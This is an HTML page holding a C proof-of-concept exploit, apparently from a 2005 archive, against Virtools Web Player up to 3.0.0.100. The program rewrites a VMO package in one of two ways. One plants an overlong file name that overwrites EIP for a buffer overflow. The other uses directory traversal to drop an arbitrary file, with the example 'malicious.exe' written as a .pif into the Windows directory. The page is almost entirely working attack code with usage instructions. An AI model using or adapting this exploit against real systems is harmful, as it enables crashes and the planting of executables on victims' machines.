<html><head><title>Virtools Web Player <= 3.0.0.100 Buffer Overflow DoS Exploit</title></head><pre>/*

by Luigi Auriemma

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/stat.h&gt;

#ifdef WIN32
    #include &lt;io.h&gt;

    typedef unsigned char   u_char;
    typedef unsigned int    u_int;
    #define ftruncate   chsize
#else
    #include &lt;unistd.h&gt;
    #include &lt;sys/types.h&gt;
#endif



#define VER     &quot;0.1&quot;
#define SIGN    &quot;Nemo&quot;
#define FILE1   &quot;components&quot;
#define FILE2   &quot;objects&quot;
#define FMT     &quot;%-10u&quot;
#define EIP     &quot;\xde\xc0\xad\xde&quot;
#define BOF     &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
                &quot;aa&quot; EIP
#define BOFFILE &quot;Nemo il pesce scemo&quot;



u_int putfile(FILE *fdout, char *fname);
void std_err(void);



struct {
    u_char  sign[4];
    u_int   unknown1;   // 0x694620
    u_int   crc;        // ???
    u_int   unknown2;   // big-endian sdk version?
    u_int   plugin1;
    u_int   plugin2;
    u_int   unknown3;   // 12
    u_int   compcsz;
    u_int   objcsz;
    u_int   objsz;
    u_int   addpath;    // ???
    u_int   components;
    u_int   objects;
    u_int   zero;       // ???
    u_int   version;
    u_int   compsz;
} vmo;



int main(int argc, char *argv[]) {
    FILE    *fd;
    u_int   i,
            len,
            off;
    int     attack;
    u_char  fname[512],
            *vmofile,
            *addfile,
            *addpath;


    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;Virtools &lt;= 3.0.0.100 buffer-overflow and directory traversal bugs &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@autistici.org\n&quot;
        &quot;web:    http://aluigi.altervista.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 3) {
        printf(&quot;\n&quot;
            &quot;Usage: %s &lt;attack&gt; &lt;file.VMO&gt;\n&quot;
            &quot;\n&quot;
            &quot;Attack:\n&quot;
            &quot; 1 = buffer-overflow\n&quot;
            &quot; 2 = directory traversal, is needed to specify also the file to add and the\n&quot;
            &quot;     special path for exploiting the bug\n&quot;
            &quot;\n&quot;
            &quot;Example: virtbugs 1 tintoys.vmo\n&quot;
            &quot;Example: virtbugs 2 tintoys.vmo malicious.exe ..\\..\\..\\..\\windows\\runme.pif\n&quot;
            &quot;Note:    will be replaced only the latest file in the package\n&quot;
            &quot;Note:    if you need a quick VMO file use the following:\n&quot;
            &quot;           http://www.virtools.com/downloads/vmo/Tintoys/tintoys.vmo&quot;
            &quot;\n&quot;, argv[0]);
        exit(1);
    }

    attack  = atoi(argv[1]);
    vmofile = argv[2];

    if((attack != 1) &amp;&amp; (attack != 2)) {
        fputs(&quot;\nError: wrong attack number chosen\n\n&quot;, stdout);
        exit(1);
    }

    printf(&quot;- open VMO file:    %s\n&quot;, vmofile);
    fd = fopen(vmofile, &quot;r+b&quot;);
    if(!fd) std_err();

    if(!fread(&amp;vmo, sizeof(vmo), 1, fd)) std_err();
    off = ftell(fd);

    if(memcmp(vmo.sign, SIGN, sizeof(vmo.sign))) {
        printf(&quot;- file seems invalid, its sign is: %.*s\n&quot;,
            sizeof(vmo.sign), vmo.sign);
    }

    printf(
        &quot;  Informations and files list:\n&quot;
        &quot;- components:       %u\n&quot;
        &quot;- objects:          %u\n&quot;
        &quot;- version:          %hhu.%hhu.%hhu.%hhu\n&quot;
        &quot;\n&quot;,
        vmo.components,
        vmo.objects,
        (vmo.version &gt;&gt; 24) &amp; 0xff, (vmo.version &gt;&gt; 16) &amp; 0xff,
        (vmo.version &gt;&gt; 8)  &amp; 0xff, vmo.version &amp; 0xff);

    fputs(
        &quot;  inSize     outSize    Filename\n&quot;
        &quot;  ------------------------------\n&quot;, stdout);

    printf(&quot;  &quot;FMT&quot; &quot;FMT&quot; %s\n&quot;, vmo.compcsz, vmo.compsz, FILE1);
    printf(&quot;  &quot;FMT&quot; &quot;FMT&quot; %s\n&quot;, vmo.objcsz,  vmo.objsz,  FILE2);
    if(fseek(fd, off + vmo.compcsz + vmo.objcsz, SEEK_SET) &lt; 0) std_err();

    for(i = 2; ; i++) {
        if(!fread(&amp;len, 4, 1, fd)) break;
        off = ftell(fd) - 4;
        if(!fread(fname, len, 1, fd)) break;

        if(len &gt; (sizeof(fname) - 1)) break; // checks
        fname[len] = 0;
        if(!*fname) break;

        if(!fread(&amp;len, 4, 1, fd)) break;
        printf(&quot;             &quot;FMT&quot; %s\n&quot;, len, fname);

        if(fseek(fd, len, SEEK_CUR) &lt; 0) std_err();
    }

    if(i &lt;= 2) {
        fputs(&quot;\n&quot;
            &quot;Error: your VMO file doesn't contain additional files so cannot be modified\n&quot;
            &quot;       try with another\n&quot;
            &quot;\n&quot;, stdout);
        exit(1);
    }

    fseek(fd, off, SEEK_SET);

    if(attack == 1) {
        fputs(&quot;\n- buffer-overflow bug exploitation\n&quot;, stdout);
        len = sizeof(BOF) - 1;
        fwrite(&amp;len, 4, 1, fd);
        fwrite(BOF, len, 1, fd);

        len = sizeof(BOFFILE) - 1;
        fwrite(&amp;len, 4, 1, fd);
        fwrite(BOFFILE, len, 1, fd);

    } else if(attack == 2) {
        fputs(&quot;\n- directory traversal bug exploitation\n&quot;, stdout);
        if(argc &lt; 5) {
            fputs(&quot;\nError: you must specify also &lt;your_file&gt; and &lt;bad_path&gt;\n\n&quot;, stdout);
            exit(1);
        }
        addfile = argv[3];
        addpath = argv[4];

        len = strlen(addpath);
        fwrite(&amp;len, 4, 1, fd);
        fwrite(addpath, len, 1, fd);

        len = putfile(fd, addfile);
    }

    fflush(fd);
    if(ftruncate(fileno(fd), ftell(fd)) &lt; 0) std_err();
    fflush(fd);
    fclose(fd);
    printf(&quot;- added a file of %u bytes\n&quot;, len);
    return(0);
}



u_int putfile(FILE *fdout, char *fname) {
    struct stat xstat;
    FILE    *fdin;
    u_int   len,
            tot = 0;
    u_char  buff[1024];

    fdin = fopen(fname, &quot;rb&quot;);
    if(!fdin) std_err();
    fstat(fileno(fdin), &amp;xstat);

    fwrite(&amp;xstat.st_size, 4, 1, fdout);

    while((len = fread(buff, 1, sizeof(buff), fdin))) {
        fwrite(buff, len, 1, fdout);
        tot += len;
    }

    fclose(fdin);
    return(tot);
}



void std_err(void) {
    perror(&quot;\nError&quot;);
    exit(1);
}

// milw0rm.com [2005-10-02]</pre></html>